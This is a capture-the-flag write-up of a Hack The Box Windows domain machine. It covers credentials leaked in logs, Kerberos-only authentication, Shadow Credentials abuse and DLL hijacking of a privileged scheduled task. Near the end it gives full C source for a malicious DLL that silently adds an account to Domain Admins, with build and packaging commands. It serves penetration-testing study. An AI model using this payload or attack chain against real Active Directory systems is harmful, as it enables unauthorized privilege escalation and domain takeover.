# HTB Season 10 — Logging (Windows / Medium) — Complete Writeup

**Starting foothold:** credentials for `wallace.everette / Welcome2026@` (simulating a realistic pentest starting point).
**personal point of view this box is medieum to hard**

---

## 1. Reconnaissance

### Nmap scan
<img width="625" height="701" alt="image" src="https://github.com/user-attachments/assets/6b5edd11-2e31-4d18-a9e1-e88d43a7d482" />

Key observations:

- Full Active Directory Domain Controller (Kerberos, LDAP, LDAPS, Global Catalog, kpasswd)
- Ports **8530/8531** = WSUS (HTTP/HTTPS) — this becomes central to the final privilege escalation
- WinRM open (5985) — will be the main shell access vector throughout
### Building the hosts file
<img width="1736" height="562" alt="image" src="https://github.com/user-attachments/assets/dc096e8f-e76d-445e-b914-2ecba069ef9d" />

### Anonymous access check
<img width="1420" height="87" alt="image" src="https://github.com/user-attachments/assets/46564020-130c-445a-8232-7cfe6632c998" />

No anonymous foothold — moving on with the provided credentials.

---

## 2. Initial Credential Validation & Roasting Attempts

### Kerberoasting / AS-REP Roasting (unsuccessful)
<img width="909" height="227" alt="image" src="https://github.com/user-attachments/assets/318e41f6-676b-489a-abfb-ecff568d9be8" />
No AS-REP roastable or Kerberoastable accounts — the environment is reasonably hardened against these classic attacks.

---
## Users and shares enumeration

<img width="1768" height="679" alt="image" src="https://github.com/user-attachments/assets/a31cc940-95c2-4365-b5c4-f2234cc52767" />
Full user list obtained — useful for later targeted attacks (Kerberoasting/spraying attempts, BloodHound cross-referencing).
Two shares stand out: `Logs` (readable) and `WSUSTemp` (no access with current creds — foreshadowing the WSUS attack later).
### Downloading and analysing the Logs share

<img width="1799" height="618" alt="image" src="https://github.com/user-attachments/assets/6bbeab24-76d0-4057-bd83-d1ea0fbcace3" />
Inside `IdentitySync_Trace_20260219.log`, a leaked domain credential is found:

```
svc_recovery : Em3rg3ncyPa$$2025
```
<img width="1743" height="420" alt="image" src="https://github.com/user-attachments/assets/c12b1c31-b223-4f7b-b214-5abcdd9fe185" />
**Lesson:** application/sync logs often leak plaintext credentials during debugging or error logging — a classic real-world misconfiguration replicated here.

---

##  Logon Restriction → Kerberos-Only Bypass

Testing the leaked credential over SMB fails:
<img width="1835" height="637" alt="image" src="https://github.com/user-attachments/assets/a757ea04-eaab-4b8b-b98e-4105542ad509" />

`STATUS_ACCOUNT_RESTRICTION` indicates the account is **restricted to Kerberos-only authentication** (NTLM logon is blocked, e.g. via `msDS-SupportedEncryptionTypes`/logon restrictions or `Protected Users` group behavior). Switching to Kerberos pre-auth:

The password fails pre-auth. Reasoning: the log was dated `20260219` and the password ends in `2025` — likely an annually-rotated password. Trying the `2026` variant, with clock sync to avoid Kerberos time-skew rejection:

<img width="1225" height="253" alt="image" src="https://github.com/user-attachments/assets/5208e10a-2886-4218-8ba5-30356a943b24" />

saving and exporting the ticket

<img width="610" height="190" alt="image" src="https://github.com/user-attachments/assets/e9b32eba-08ff-4448-a060-b1f9d8eedae7" />


**Foothold #1 achieved: valid TGT for `svc_recovery`.**

---

##  BloodHound Enumeration

<img width="1157" height="730" alt="image" src="https://github.com/user-attachments/assets/0076c1d5-39cf-4543-8344-b4e6febc1ebb" />

Key finding: `svc_recovery` has **GenericWrite** over `MSA_HEALTH$`. `MSA_HEALTH$` is a member of **Remote Management Users** (WinRM access) and **Domain Computers**.
This opens a **Shadow Credentials** attack path.

<img width="556" height="207" alt="image" src="https://github.com/user-attachments/assets/a908edea-ce39-41b1-8ff6-d33344663d75" />

---
<img width="1258" height="545" alt="image" src="https://github.com/user-attachments/assets/46f10021-9f2a-4682-ba09-d298d9fee9ea" />

## 6. Shadow Credentials Attack (GenericWrite Abuse)

### Concept

Shadow Credentials abuses the `msDS-KeyCredentialLink` attribute to inject an attacker-controlled public key into a target object. This enables authentication via **PKINIT**, requesting a TGT _as the target object_ — without ever touching or knowing the object's actual password.

<img width="1189" height="392" alt="image" src="https://github.com/user-attachments/assets/4eaf211c-3c17-42f3-8b7d-944fb5239641" />

**Foothold #2 achieved: shell as `MSA_HEALTH$`.**

---

## Local Enumeration → Scheduled Task & DLL Hijacking

### WinPEAS finding: a privileged scheduled task

WinPEAS reveals a scheduled task running as `logging\Administrator`:

```
UpdateChecker Agent: "C:\Program Files\UpdateMonitor\UpdateMonitor.exe" /scan=3 /autofix=true
Trigger: repeats every 00:03:00 indefinitely
```
<img width="1563" height="90" alt="image" src="https://github.com/user-attachments/assets/67b44ab1-5148-4373-94d8-9766f4d32f16" />

### Checking folder ACLs

<img width="991" height="250" alt="image" src="https://github.com/user-attachments/assets/2cd756b7-9448-450e-b92a-ba96c924293a" />


The `IT` group has **Full Control** over this directory (explicitly granted, not inherited). Checking membership:

<img width="1216" height="274" alt="image" src="https://github.com/user-attachments/assets/99ca313d-e684-433b-b632-d687383051d5" />

```
The only member of the IT group is JAYLEE.CLIFTON
```

### Confirming DLL Hijacking

<img width="831" height="304" alt="image" src="https://github.com/user-attachments/assets/ca364b97-c0fe-4758-955a-bd6bd1925f10" />

<img width="583" height="119" alt="image" src="https://github.com/user-attachments/assets/bf11a77e-4658-425d-9667-12aca386460a" />


`BUILTIN\Users` (which `MSA_HEALTH$` is a member of) has write access to this directory — a classic **DLL Hijacking** vulnerability: the privileged process searches for a DLL it can't find, and any authenticated user can plant it.

### Building and delivering the malicious DLL

The program reads from `C:\ProgramData\UpdateMonitor\Settings_Update.zip` and loads the DLL contained inside.

<img width="855" height="203" alt="image" src="https://github.com/user-attachments/assets/75c30f59-4742-4b5b-879c-042fbd63330d" />

<img width="994" height="472" alt="image" src="https://github.com/user-attachments/assets/ead36b35-de65-4e77-bced-42e028d68d94" />

The scheduled task fires (max 3-minute wait), loads the malicious DLL, and a reverse shell is caught:

<img width="542" height="152" alt="image" src="https://github.com/user-attachments/assets/c65a1798-5b0b-4a66-bbb2-4b0fbaf55b8c" />

<img width="954" height="768" alt="image" src="https://github.com/user-attachments/assets/8efd64dd-010e-47db-9fd2-1e4723ef2705" />

**Foothold #3 achieved: shell as `jaylee.clifton`.**

<img width="444" height="69" alt="image" src="https://github.com/user-attachments/assets/c6561ece-a3f2-431d-aecd-8c81126f3e3d" />

---

## 8. Root — flag

### reexploiting the same plan with different dll

```
cat > domain_admin.c << 'EOF'  
#include <windows.h>  
#include <stdlib.h>  
  
BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID reserved) {  
    if (reason == DLL_PROCESS_ATTACH) {  
        system("powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \""  
               "Add-ADGroupMember -Identity 'Domain Admins' -Members 'MSA_HEALTH$'"  
               "\"");  
    }  
    return TRUE;  
}  
EOF  
  
x86_64-w64-mingw32-gcc -shared -o settings_update.dll domain_admin.c -s  
zip Settings_Update.zip settings_update.dll
```
**Root flag captured.**
<img width="1528" height="354" alt="image" src="https://github.com/user-attachments/assets/a3db7377-efaf-4210-ae54-616cd608d0c7" />
<img width="573" height="103" alt="image" src="https://github.com/user-attachments/assets/091fe656-8c0b-44b0-8e99-b1743faf5425" />
